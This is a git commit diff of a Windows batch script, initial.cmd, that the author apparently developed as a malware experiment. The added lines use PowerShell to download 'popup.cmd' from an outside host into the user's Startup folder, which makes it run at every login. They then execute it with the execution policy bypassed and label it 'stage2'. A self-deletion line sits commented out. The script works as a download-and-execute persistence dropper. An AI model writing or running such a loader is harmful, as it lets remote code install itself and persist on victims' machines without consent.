b02e985ea39d3a10af3ecebcd69d49226c530460
Oorth <arthmaurya@gmail.com>
2024-11-28 19:05:52 +0530

    Maksad

--- initial.cmd
+++ initial.cmd
@@ -2,15 +2,21 @@
 @REM @echo off
 
 SET currentDirectory=%cd%
-echo Current directory: %currentDirectory%
 
-SET TARGETPATH="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-cd %TARGETPATH%
+SET STARTUPPATH="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+cd %STARTUPPATH%
 
-make a message box
-(echo MsgBox "Line 1", 262192, "Title") > popup.vbs
+SET DOWNLOADPATH="C:\malware\test"
+
+@REM download the payload
+powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/popup.cmd' -OutFile 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\popup.cmd'
+
+@REM run stage2
+powershell -ExecutionPolicy Bypass -Command "& 'C:\Users\Arth\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\popup.cmd'"
+
 
 @REM cd %currentDirectory%
 
-del initial.bat
+@rem uncomment to make the script delete itself
+@rem del initial.bat
 
